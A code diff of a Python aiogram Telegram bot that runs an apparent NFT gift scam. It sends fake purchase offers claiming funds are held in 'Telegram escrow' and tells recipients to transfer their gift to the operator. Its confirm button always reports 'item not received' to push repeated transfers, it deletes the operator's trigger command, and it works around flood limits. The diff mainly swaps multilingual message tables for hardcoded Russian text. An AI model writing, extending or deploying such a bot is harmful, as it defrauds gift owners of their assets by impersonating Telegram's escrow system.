@@ -10,7 +10,7 @@ from datetime import datetime, timedelta
 from aiogram import Bot, Dispatcher, F
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
-from aiogram.filters import CommandStart, CommandObject
+from aiogram.filters import CommandStart
 from aiogram.types import (
     CallbackQuery, InlineKeyboardButton, Message,
     LinkPreviewOptions
@@ -85,101 +85,6 @@ def remove_user(value: str):
     db.commit()
 
 
-# ── Переводы ─────────────────────────────────────────────────
-TEXTS = {
-    "ru": {
-        "offer":         "Пользователь предлагает вам",
-        "for":           "за подарок",
-        "valid":         "Оффер действителен ещё",
-        "order":         "Ордер",
-        "reserved":      "Покупатель зарезервировал",
-        "escrow":        ("через эскроу-систему Telegram. Средства хранятся на специальном "
-                          "эскроу-счёте и будут автоматически зачислены на ваш баланс"),
-        "after":         "сразу после передачи подарка.",
-        "instr":         "Инструкция для завершения сделки:",
-        "step1":         "Передайте подарок пользователю:",
-        "step2":         "Нажмите «Передать NFT» и выберите",
-        "step3":         "Подтвердите передачу подарка.",
-        "credits":       "Telegram зафиксирует транзакцию и моментально зачислит",
-        "balance":       "на ваш баланс. Резерв действует 24 часа.",
-        "declined":      "Оффер на NFT",
-        "declined_end":  "отменён.",
-        "expired":       "Оффер истёк.",
-        "warn":          ("Внимание!\n\nСледуйте инструкции, чтобы не потерять подарок "
-                          "и получить оплату.\n\nНажмите «ОК», если вы прочитали это сообщение."),
-        "not_received":  "Внимание!\n\nТовар не получен, попробуйте передать ещё раз и нажмите кнопку.",
-        "transfer":      "Передать NFT ↗",
-        "confirm":       "Подтвердить передачу",
-        "accept":        "Принять",
-        "decline":       "Отклонить",
-        "no_access":     "У вас нет доступа к боту. Обратитесь к администратору.",
-        "stars":         "Звёзд",
-        "gram":          "GRAM",
-    },
-    "uk": {
-        "offer":         "Користувач пропонує вам",
-        "for":           "за подарунок",
-        "valid":         "Пропозиція дійсна ще",
-        "order":         "Замовлення",
-        "reserved":      "Покупець зарезервував",
-        "escrow":        ("через ескроу-систему Telegram. Кошти зберігаються на спеціальному "
-                          "ескроу-рахунку та будуть автоматично зараховані на ваш баланс"),
-        "after":         "одразу після передачі подарунку.",
-        "instr":         "Інструкція для завершення угоди:",
-        "step1":         "Передайте подарунок користувачу:",
-        "step2":         "Натисніть «Передати NFT» та виберіть",
-        "step3":         "Підтвердіть передачу подарунку.",
-        "credits":       "Telegram зафіксує транзакцію та миттєво зарахує",
-        "balance":       "на ваш баланс. Резерв діє 24 години.",
-        "declined":      "Пропозицію на NFT",
-        "declined_end":  "відхилено.",
-        "expired":       "Пропозиція вичерпана.",
-        "warn":          ("Увага!\n\nДотримуйтесь інструкції, щоб не втратити подарунок "
-                          "та отримати оплату.\n\nНатисніть «ОК», якщо ви прочитали це повідомлення."),
-        "not_received":  "Увага!\n\nТовар не отримано, спробуйте передати ще раз та натисніть кнопку.",
-        "transfer":      "Передати NFT ↗",
-        "confirm":       "Підтвердити передачу",
-        "accept":        "Прийняти",
-        "decline":       "Відхилити",
-        "no_access":     "У вас немає доступу до бота. Зверніться до адміністратора.",
-        "stars":         "Зірок",
-        "gram":          "GRAM",
-    },
-    "en": {
-        "offer":         "A user offers you",
-        "for":           "for the gift",
-        "valid":         "Offer valid for another",
-        "order":         "Order",
-        "reserved":      "The buyer has reserved",
-        "escrow":        ("via Telegram escrow. Funds are held in a dedicated escrow account "
-                          "and will be automatically credited to your balance"),
-        "after":         "immediately after the gift is transferred.",
-        "instr":         "Instructions to complete the deal:",
-        "step1":         "Transfer the gift to:",
-        "step2":         "Tap «Transfer NFT» and select",
-        "step3":         "Confirm the gift transfer.",
-        "credits":       "Telegram will record the transaction and instantly credit",
-        "balance":       "to your balance. The reserve is valid for 24 hours.",
-        "declined":      "Offer for NFT",
-        "declined_end":  "declined.",
-        "expired":       "Offer expired.",
-        "warn":          ("Attention!\n\nFollow the instructions to avoid losing the gift "
-                          "and to receive your payment.\n\nPress «OK» if you have read this message."),
-        "not_received":  "Attention!\n\nItem not received. Please try transferring again and press the button.",
-        "transfer":      "Transfer NFT ↗",
-        "confirm":       "Confirm transfer",
-        "accept":        "Accept",
-        "decline":       "Decline",
-        "no_access":     "You don't have access to this bot. Contact the administrator.",
-        "stars":         "Stars",
-        "gram":          "GRAM",
-    },
-}
-
-def T(lang, key):
-    return TEXTS.get(lang, TEXTS["ru"]).get(key, TEXTS["ru"][key])
-
-
 # ── Хелперы ──────────────────────────────────────────────────
 def gen_order_id() -> str:
     return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
@@ -211,70 +116,82 @@ def fmt_remaining(sent_at_str: str) -> str:
     h, m = divmod(total_min, 60)
     return f"{h} ч. {m} мин."
 
-def fmt_amount(amount: int, currency: str, lang: str) -> str:
+def fmt_stars(amount: int) -> str:
+    return f"<b>{amount:,} ⭐️ Звёзд</b>"
+
+def fmt_gram(amount: int) -> str:
+    return f"<b>{amount:,} GRAM</b>"
+
+def fmt_amount(amount: int, currency: str) -> str:
+    return fmt_stars(amount) if currency == "s" else fmt_gram(amount)
+
+def fmt_amount_plain(amount: int, currency: str) -> str:
     if currency == "s":
-        return f"<b>{amount:,} ⭐️ {T(lang, 'stars')}</b>"
-    return f"<b>{amount:,} {T(lang, 'gram')}</b>"
-
-def fmt_amount_plain(amount: int, currency: str, lang: str) -> str:
-    if currency == "s":
-        return f"{amount:,} ⭐️ {T(lang, 'stars')}"
-    return f"{amount:,} {T(lang, 'gram')}"
-
-def cur_name(currency: str, lang: str) -> str:
-    return T(lang, "stars") if currency == "s" else T(lang, "gram")
+        return f"{amount:,} ⭐️ Звёзд"
+    return f"{amount:,} GRAM"
 
 
-# ── Тексты ───────────────────────────────────────────────────
-def offer_text_plain(d: dict) -> str:
-    lang = d.get("lang", "ru")
+# ── Тексты (из оригинала bot.py) ─────────────────────────────
+def offer_text(d: dict) -> str:
+    """Оффер со ссылкой на NFT"""
     return (
-        f"{T(lang,'offer')} {fmt_amount(d['amount'], d['currency'], lang)} "
-        f"{T(lang,'for')} <b>{d['nft_slug']} #{d['nft_num']}</b>.\n\n"
-        f"{T(lang,'valid')} <b>{fmt_remaining(d['sent_at'])}</b>"
+        f"Пользователь предлагает вам "
+        f"{fmt_amount(d['amount'], d['currency'])} за подарок "
+        f"<a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a>.\n\n"
+        f"Оффер действителен ещё <b>{fmt_remaining(d['sent_at'])}</b>"
     )
 
-def offer_text_linked(d: dict) -> str:
-    lang = d.get("lang", "ru")
+def offer_text_plain(d: dict) -> str:
+    """Без ссылки — для первого шага (PEER_FLOOD fix)"""
     return (
-        f"{T(lang,'offer')} {fmt_amount(d['amount'], d['currency'], lang)} "
-        f"{T(lang,'for')} <b><a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a></b>.\n\n"
-        f"{T(lang,'valid')} <b>{fmt_remaining(d['sent_at'])}</b>"
+        f"Пользователь предлагает вам "
+        f"{fmt_amount(d['amount'], d['currency'])} за подарок "
+        f"<b>{d['nft_slug']} #{d['nft_num']}</b>.\n\n"
+        f"Оффер действителен ещё <b>{fmt_remaining(d['sent_at'])}</b>"
     )
 
 def deal_text(d: dict) -> str:
-    lang = d.get("lang", "ru")
-    cur  = fmt_amount_plain(d['amount'], d['currency'], lang)
+    """Карточка сделки — текст из оригинала"""
+    amount_str = fmt_amount_plain(d['amount'], d['currency'])
+    if d['currency'] == 's':
+        escrow_cur = "Telegram Stars"
+        credit_str = f"<b>{d['amount']:,} ⭐️ Звёзд</b>"
+    else:
+        escrow_cur = "GRAM"
+        credit_str = f"<b>{d['amount']:,} GRAM</b>"
+
     return (
-        f"{T(lang,'order')} <b>#{d['order_id']}</b>\n\n"
-        f"{T(lang,'reserved')} <b>{cur}</b> {T(lang,'escrow')} "
-        f"{cur_name(d['currency'], lang)} {T(lang,'after')}\n\n"
-        f"<b>{T(lang,'instr')}</b>\n"
-        f"1. {T(lang,'step1')} @{d['buyer_username']}\n"
-        f"2. {T(lang,'step2')} <a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a>\n"
-        f"3. {T(lang,'step3')}\n\n"
-        f"{T(lang,'credits')} <b>{cur}</b> {T(lang,'balance')}"
+        f"Ордер <b>#{d['order_id']}</b>\n\n"
+        f"Покупатель зарезервировал <b>{amount_str}</b> через эскроу-систему "
+        f"Telegram. Средства хранятся на специальном эскроу-счёте и будут автоматически "
+        f"зачислены на ваш баланс {escrow_cur} сразу после передачи подарка.\n\n"
+        f"<b>Инструкция для завершения сделки:</b>\n"
+        f"1. Передайте подарок пользователю: @{d['buyer_username']}\n"
+        f"2. Нажмите «Передать NFT» и выберите "
+        f"<a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a>\n"
+        f"3. Подтвердите передачу подарка.\n\n"
+        f"Telegram зафиксирует транзакцию и моментально зачислит "
+        f"{credit_str} на ваш баланс. Резерв действует 24 часа."
     )
 
 
 # ── Клавиатуры ───────────────────────────────────────────────
-def offer_kb(order_id: str, lang: str = "ru"):
+def offer_kb(order_id: str):
     kb = InlineKeyboardBuilder()
     kb.row(
-        InlineKeyboardButton(text=T(lang,"decline"), callback_data=f"decline:{order_id}"),
-        InlineKeyboardButton(text=T(lang,"accept"),  callback_data=f"accept:{order_id}"),
+        InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{order_id}"),
+        InlineKeyboardButton(text="Принять",   callback_data=f"accept:{order_id}"),
     )
     return kb.as_markup()
 
 def deal_kb(d: dict):
-    lang = d.get("lang", "ru")
     kb = InlineKeyboardBuilder()
     kb.row(InlineKeyboardButton(
-        text=T(lang,"transfer"),
+        text="Передать NFT ↗",
         url=f"tg://send_gift?to={d['buyer_username']}",
     ))
     kb.row(InlineKeyboardButton(
-        text=T(lang,"confirm"),
+        text="Подтвердить передачу",
         callback_data=f"confirm:{d['order_id']}",
     ))
     return kb.as_markup()
@@ -287,7 +204,7 @@ def admin_kb(order_id: str):
     )
     return kb.as_markup()
 
-def lp_show(nft_url: str) -> LinkPreviewOptions:
+def lp(nft_url: str) -> LinkPreviewOptions:
     return LinkPreviewOptions(
         url=nft_url,
         show_above_text=True,
@@ -307,7 +224,7 @@ async def offer_timer(order_id: str):
             upd(order_id, status="expired")
             try:
                 await bot.edit_message_text(
-                    T(d.get("lang","ru"), "expired"),
+                    "Оффер истёк.",
                     business_connection_id=d["biz_id"] or None,
                     chat_id=d["chat_id"],
                     message_id=d["offer_msg_id"],
@@ -318,12 +235,12 @@ async def offer_timer(order_id: str):
             break
         try:
             await bot.edit_message_text(
-                offer_text_linked(d),
+                offer_text(d),
                 business_connection_id=d["biz_id"] or None,
                 chat_id=d["chat_id"],
                 message_id=d["offer_msg_id"],
-                reply_markup=offer_kb(order_id, d.get("lang","ru")),
-                link_preview_options=lp_show(d["nft_url"]),
+                reply_markup=offer_kb(order_id),
+                link_preview_options=lp(d["nft_url"]),
             )
         except Exception:
             pass
@@ -341,10 +258,8 @@ async def cmd_start(message: Message):
         return
     await message.answer(
         "Формат команды:\n"
-        "<code>.buy https://t.me/nft/Name-123 7373 g</code> — GRAM\n"
         "<code>.buy https://t.me/nft/Name-123 500 s</code> — Stars\n"
-        "<code>.buy https://t.me/nft/Name-123 500 s uk</code> — украинский\n"
-        "<code>.buy https://t.me/nft/Name-123 500 s en</code> — английский"
+        "<code>.buy https://t.me/nft/Name-123 7373 g</code> — GRAM"
     )
 
 
@@ -403,14 +318,14 @@ async def cmd_buy(message: Message):
                 return
             owner_username = biz_conn.user.username
             if not is_allowed(owner_id, owner_username):
-                await bot.send_message(owner_id, T("ru", "no_access"))
+                await bot.send_message(owner_id, "У вас нет доступа к боту. Обратитесь к администратору.")
                 return
             buyer_username = owner_username or str(owner_id)
         except Exception:
             return
     else:
         if not is_allowed(message.from_user.id, message.from_user.username):
-            await message.answer(T("ru", "no_access"))
+            await message.answer("У вас нет доступа к боту.")
             return
         buyer_username = message.from_user.username or str(message.from_user.id)
 
@@ -420,12 +335,24 @@ async def cmd_buy(message: Message):
 
     nft_url  = m.group(1)
     amount   = int(m.group(2))
-    currency = m.group(3).lower()            # s | g
-    lang     = (m.group(4) or "ru").lower()  # ru | uk | en
+    currency = m.group(3).lower()   # s | g
+    lang     = (m.group(4) or "ru").lower()
 
     slug, num = parse_nft(nft_url)
     if not slug:
         return
+
+    # Удаляем .buy
+    try:
+        if biz_id:
+            await bot.delete_business_messages(
+                business_connection_id=biz_id,
+                message_ids=[message.message_id],
+            )
+        else:
+            await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
+    except Exception as e:
+        logging.error(f"delete .buy: {e}")
 
     order_id = gen_order_id()
     chat_id  = message.chat.id
@@ -443,25 +370,13 @@ async def cmd_buy(message: Message):
     d = get_deal(order_id)
     send_kw = {"business_connection_id": biz_id} if biz_id else {}
 
-    # Удаляем .buy
-    try:
-        if biz_id:
-            await bot.delete_business_messages(
-                business_connection_id=biz_id,
-                message_ids=[message.message_id],
-            )
-        else:
-            await bot.delete_message(chat_id=chat_id, message_id=message.message_id)
-    except Exception as e:
-        logging.error(f"delete .buy: {e}")
-
-    # Отправляем оффер сразу со ссылкой и превью
+    # ШАГ 1: без ссылки (PEER_FLOOD fix)
     try:
         msg = await bot.send_message(
             chat_id,
-            offer_text_linked(d),
-            reply_markup=offer_kb(order_id, lang),
-            link_preview_options=lp_show(nft_url),
+            offer_text_plain(d),
+            reply_markup=offer_kb(order_id),
+            link_preview_options=LinkPreviewOptions(is_disabled=True),
             **send_kw,
         )
         upd(order_id, offer_msg_id=msg.message_id)
@@ -470,16 +385,30 @@ async def cmd_buy(message: Message):
         logging.error(f"SEND OFFER ERROR: {e!r}")
         return
 
+    # ШАГ 2: редактируем со ссылкой и превью
+    await asyncio.sleep(1.5)
+    try:
+        await bot.edit_message_text(
+            offer_text(d),
+            chat_id=chat_id,
+            message_id=msg.message_id,
+            reply_markup=offer_kb(order_id),
+            link_preview_options=lp(nft_url),
+            **send_kw,
+        )
+    except TelegramBadRequest as e:
+        logging.error(f"edit offer: {e}")
+
     asyncio.create_task(offer_timer(order_id))
 
-    # Уведомление админу о новом оффере
+    # Уведомление админу
     try:
         await bot.send_message(
             ADMIN_ID,
             f"📤 <b>Новый оффер отправлен</b>\n\n"
             f"Ордер: <b>{order_id}</b>\n"
             f"NFT: <b>{slug} #{num}</b>\n"
-            f"Сумма: <b>{fmt_amount_plain(amount, currency, lang)}</b>\n"
+            f"Сумма: <b>{fmt_amount_plain(amount, currency)}</b>\n"
             f"От: @{buyer_username}\n"
             f"Ссылка: {nft_url}",
         )
@@ -496,12 +425,13 @@ async def cb_accept(call: CallbackQuery):
         await call.answer("Оффер недоступен.", show_alert=True)
         return
 
-    lang = d.get("lang", "ru")
+    await call.answer(
+        "Внимание!\n\n"
+        "Следуйте инструкции, чтобы не потерять подарок и получить оплату.\n\n"
+        "Нажмите «ОК», если вы прочитали это сообщение.",
+        show_alert=True
+    )
 
-    # Сначала отвечаем — размораживаем кнопку
-    await call.answer(T(lang, "warn"), show_alert=True)
-
-    # Меняем статус
     upd(order_id, status="active")
 
     biz_id = d["biz_id"] or None
@@ -512,11 +442,10 @@ async def cb_accept(call: CallbackQuery):
             chat_id=d["chat_id"],
             message_id=d["offer_msg_id"],
             reply_markup=deal_kb(d),
-            link_preview_options=lp_show(d["nft_url"]),
+            link_preview_options=lp(d["nft_url"]),
         )
     except Exception as e:
         logging.error(f"edit to deal: {e}")
-        # Откат — чтобы повторное нажатие сработало
         upd(order_id, status="offer")
         return
 
@@ -527,7 +456,7 @@ async def cb_accept(call: CallbackQuery):
                 d["chat_id"],
                 deal_text(d),
                 reply_markup=deal_kb(d),
-                link_preview_options=lp_show(d["nft_url"]),
+                link_preview_options=lp(d["nft_url"]),
             )
         except Exception as e:
             logging.error(f"send deal to buyer: {e}")
@@ -542,13 +471,12 @@ async def cb_decline(call: CallbackQuery):
         return
 
     upd(order_id, status="declined")
-    lang = d.get("lang", "ru")
-    await call.answer(T(lang, "declined_end"))
+    await call.answer("Вы отклонили оффер.")
 
     biz_id = d["biz_id"] or None
     try:
         await bot.edit_message_text(
-            f"{T(lang,'declined')} <a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a> {T(lang,'declined_end')}",
+            f"Оффер на NFT <a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a> отменён.",
             business_connection_id=biz_id,
             chat_id=d["chat_id"],
             message_id=d["offer_msg_id"],
@@ -568,8 +496,10 @@ async def cb_confirm(call: CallbackQuery):
         await call.answer("Ордер недоступен.", show_alert=True)
         return
 
-    lang = d.get("lang", "ru")
-    await call.answer(T(lang, "not_received"), show_alert=True)
+    await call.answer(
+        "Внимание!\n\nТовар не получен, попробуйте передать ещё раз и нажмите кнопку.",
+        show_alert=True
+    )
 
     try:
         await bot.send_message(
@@ -577,7 +507,7 @@ async def cb_confirm(call: CallbackQuery):
             f"🔔 <b>Попытка подтверждения</b>\n\n"
             f"Ордер: <b>{d['order_id']}</b>\n"
             f"NFT: <b>{d['nft_slug']} #{d['nft_num']}</b>\n"
-            f"Сумма: <b>{fmt_amount_plain(d['amount'], d['currency'], lang)}</b>\n"
+            f"Сумма: <b>{fmt_amount_plain(d['amount'], d['currency'])}</b>\n"
             f"Покупатель: @{d['buyer_username']}\n"
             f"Ссылка: {d['nft_url']}\n\n"
             f"Нажми если NFT реально передан:",
@@ -600,16 +530,14 @@ async def cb_adm_ok(call: CallbackQuery):
     upd(order_id, status="completed")
     await call.answer("Подтверждено.")
     await call.message.edit_reply_markup(reply_markup=None)
-    await call.message.answer(f"Ордер {order_id} завершён.")
 
-    lang   = d.get("lang", "ru")
     biz_id = d["biz_id"] or None
     try:
         await bot.send_message(
             d["chat_id"],
-            f"Передача подтверждена!\n\n"
-            f"{T(lang,'order')} <b>{d['order_id']}</b>\n"
-            f"<b>{fmt_amount_plain(d['amount'], d['currency'], lang)}</b> зачислены на ваш баланс.",
+            f"✅ Сделка завершена!\n\n"
+            f"Ордер <b>#{d['order_id']}</b> выполнен.\n"
+            f"{fmt_amount_plain(d['amount'], d['currency'])} зачислены на ваш баланс.",
             business_connection_id=biz_id,
         )
     except Exception as e:
